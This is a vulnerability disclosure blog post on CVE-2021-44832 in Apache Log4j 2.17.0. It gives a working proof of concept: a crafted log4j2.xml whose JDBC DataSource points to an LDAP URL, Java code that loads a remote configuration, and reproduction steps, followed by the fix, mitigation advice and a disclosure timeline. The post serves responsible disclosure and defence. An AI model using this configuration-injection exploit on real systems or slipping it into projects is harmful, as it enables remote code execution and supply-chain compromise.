---
title: "CVE-2021-44832: Apache Log4j 2.17.0 Arbitrary Code Execution via JDBCAppender DataSource Element"
date: 2021-12-28
tags:
	- "java"
	- "deserialization"
	- "log4j"
	- "log4j2"
advisory: false
origin: https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element
cves:
	- "CVE-2021-44832"
---
# Introduction
Log4j is a highly popular logging package in Java that is used widely by developers, companies such as Google, Steam, Apple, Minecraft, and even on one of NASA’s Mars rovers utilize this package. On December 9th, the most critical zero-day exploit in recent years was discovered in log4j. The vulnerability [CVE-2021-44228](https://checkmarx.com/blog/apache-log4j-remote-code-execution-cve-2021-44228/?) was unauthenticated, zero-click RCE (Remote Code Execution) by logging a certain payload.

Following that, a big hype was created in the world and especially in the security community, making many researchers interested in logging packages. Several other vulnerabilities and bypasses were found and published since then in log4j and other logging packages, find out more on our [“Variants and Updates”](https://checkmarx.com/resources/homepage/apache-log4j-rce-variants-and-updates?) blog.


# Technical Details
Being extremely focused and dedicated researchers, we wanted to do a security audit ourselves on the log4j package in the hope of finding something interesting. And after a week of reviewing the code and testing, we encountered a new undiscovered deserialization security vulnerability. This vulnerability doesn’t use the disabled lookup feature.

The complexity of this vulnerability is higher than the original CVE-2021-44228 since it requires the attacker to have control over the configuration (like the ‘logback’ vulnerability [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550)). **In log4j there is a feature to load a remote configuration file** that isn't part of the local codebase and opens various attack vectors such as [MITM](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) (man in the middle) attack, DNS poisoning, lateral movement after gaining access to a storage node.

While looking at log4j features we came across the [‘Appender’](https://logging.apache.org/log4j/2.x/manual/appenders.html) functionalities. Appenders are basically where to output the logs, so we have for example ConsoleAppender, FileAppender, etc.

The [JDBCAppender](https://logging.apache.org/log4j/2.x/manual/appenders.html#JDBCAppender) caught our eyes since there are some public ways of getting RCE via JDBC Java deserialization (see this [Blackhat](https://www.youtube.com/watch?v=Lv9BC_bYaI8) talk By Yongtao Wang, Lucas Zhang and Kunzhe Chai for more information).

But before getting into the JDBC deserialization in log4j, we noticed that in the documentation there is a way to configure log4j so that it will fetch the database source dynamically and remotely via JNDI. The configuration of the remote database location is done with the DataSource element. Taking the example from the official documentation:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="error">
	<Appenders>
	<JDBC name="databaseAppender" tableName="dbo.application_log">
		     <DataSource jndiName="java:/comp/env/jdbc/LoggingDataSource" />
		 <Column ...
	</JDBC>
 </Appenders>
…
</Configuration>
```
there was not any restriction of putting an arbitrary LDAP remote URL, thus making it potential to the classic JNDI:LDAP deserialization vector (more information on the [Blackhat](https://www.youtube.com/watch?v=Y8a5nB-vy78) talk by Alvaro Munoz & Oleksandr Mirosh).
After changing the tag to:
```xml
<DataSource jndiName="ldap://127.0.0.1:1389/Exploit"/>
```
our payload was triggered, and we executed calc.exe on the machine.
<img src="/img/blogs/log4j2/Image-1.png" style="width: 100%;"/>
<video controls="" src="/videos/log4j2/Video-1.mov" style="width: 100%;"></video>

`DataSource dataSource = (DataSource)context.lookup(jndiName);`

Is the line that triggers the JNDI lookup, it is in `DataSourceConnectionSource -> createConnectionSource` which is called from the `PluginBuilder`. And this is also the reason for the crash since we cannot cast the object to DataSource (the crash happens after the deserialization). The lookup function will do LDAP lookup to the “RemainingName” which is the DN (what comes after the slash).

To understand the calls better, we can follow the callgraph bottom up to see who calls who:
```
createConnectionSource:75, DataSourceConnectionSource (org.apache.logging.log4j.core.appender.db.jdbc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
build:136, PluginBuilder (org.apache.logging.log4j.core.config.plugins.util)
createPluginObject:1120, AbstractConfiguration (org.apache.logging.log4j.core.config)
createConfiguration:1045, AbstractConfiguration (org.apache.logging.log4j.core.config)
createConfiguration:1037, AbstractConfiguration (org.apache.logging.log4j.core.config)
createConfiguration:1037, AbstractConfiguration (org.apache.logging.log4j.core.config)
doConfigure:651, AbstractConfiguration (org.apache.logging.log4j.core.config)
initialize:247, AbstractConfiguration (org.apache.logging.log4j.core.config)
start:293, AbstractConfiguration (org.apache.logging.log4j.core.config)
setConfiguration:626, LoggerContext (org.apache.logging.log4j.core)
reconfigure:699, LoggerContext (org.apache.logging.log4j.core)
reconfigure:716, LoggerContext (org.apache.logging.log4j.core)
start:270, LoggerContext (org.apache.logging.log4j.core)
getContext:155, Log4jContextFactory (org.apache.logging.log4j.core.impl)
getContext:47, Log4jContextFactory (org.apache.logging.log4j.core.impl)
getContext:196, LogManager (org.apache.logging.log4j)
getLogger:599, LogManager (org.apache.logging.log4j)
main:11, log4j
```

# Steps To Reproduce
For the vulnerability to be exploitable, Log4J’s configuration file needs to be loaded from an external source. This can be a remote FTP server, cloud storage etc. An attacker could use technics such as DNS poisoning and MITM in order to inject a uniquely crafted configuration file and ultimately exploit the vulnerability.

1. Fetching Remote configuration via HTTP
```java
System.setProperty("log4j2.configurationFile","http://127.0.0.1:8888/log4j2.xml");
```
2. Using the same LDAP (Lightweight Directory Access Protocol) server as done in the CVE-2021-44228 PoC (Proof of Concept), all we need to do is to run:
```java
//log4j.java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j {
    static {
        System.setProperty("log4j2.configurationFile","http://127.0.0.1:8888/log4j2.xml");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
    }
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
    }
}
```
3. Inject the malicious log4j2.xml file into the response:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="error">
    <Appenders>
        <JDBC name="databaseAppender" tableName="dbo.application_log">
            <DataSource jndiName="ldap://127.0.0.1:1389/Exploit" />
            <Column name="eventDate" isEventTimestamp="true" />
            <Column name="level" pattern="%level" />
            <Column name="logger" pattern="%logger" />
            <Column name="message" pattern="%message" />
            <Column name="exception" pattern="%ex{full}" />
        </JDBC>
    </Appenders>
    <Loggers>
        <Root level="warn">
            <AppenderRef ref="databaseAppender"/>
        </Root>
    </Loggers>
</Configuration>
```

# Expected Results
When initializing the logger object, a request to the remote log4j2.xml will be made. In the loading process, an attempt to load the DataSource object will make a request to the LDAP server that will then redirect to a malicious class. In the end, the arbitrary class will be deserialized and executed.

# Apache’s Fix
On December 27th the fixing commit [05db5f9](https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16) was released. As we can see before the fix, the lookup of the DataSource was made directly with the InitialContext, which is a Java internal class.

<img src="/img/blogs/log4j2/Image-2.jpg" style="width: 100%;"/>

In version 2.17.1 the lookup uses the log4j’s JNDI wrapper, and thus disables the lookup. A new log4j2.enableJndiJdbc system property was added to reenable this functionality.

This is the reason why the vulnerability is exploitable using log4j’s default system properties.

# Why Is This Interesting?
There are two main configuration scenarios when using Log4J.

* The configuration is on a remote location. This can be useful for developers in case of multiple products sharing the same logging configuration. In this case, an attacker could expand their control over a network by gaining access to the node that serves the configuration file, or use techniques such as MITM and DNS poisoning to inject a malicious configuration file and trigger code execution.
* The configuration is a local file and is part of the repository or project. This is the case for most products in the wild. Even though this scenario is harder to leverage, an attacker could attempt to alter the configuration file by gaining access to the source code, especially if it’s an open-source project that’s maintained by a community such as GitHub. For example, an attacker could find a popular Java package that’s using Log4J, alter its configuration file, and cause a supply chain attack for developers who are using this package. **Unlike changes to the code itself, configuration files tend to draw less focus and are easier to “sweep under the rug”.**

# Mitigation
Upgrade your Apache Log4j2 to versions 2.17.1, 2.12.4, and 2.3.2 or above.

# Timeline of Disclosure
| Date    | Action |
| -------- | ------- |
| 27/12/2021 | Responsible disclosure was made to Apache. |
| 27/12/2021 | Acknowledgment received from Apache. |
| 28/12/2021 | Checkmarx customers who were using Log4J were warned, without exposing the vulnerability‘s details. |
| 28/12/2021 | CVE-2021-44832 was assigned to this issue. |
| 28/12/2021 | Fixed version 2.17.1 was released. |